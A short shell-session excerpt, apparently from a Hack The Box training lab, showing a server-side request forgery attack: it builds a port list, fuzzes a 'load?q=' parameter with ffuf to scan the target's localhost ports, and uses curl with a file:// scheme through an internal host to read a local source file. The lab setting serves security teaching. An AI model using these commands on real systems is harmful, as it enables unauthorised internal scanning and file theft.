```shell-session
Orbixio@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done
Orbixio@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
```

```shell-session
# Retrieving a local file through the target application - File Schema
Orbixio@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
```
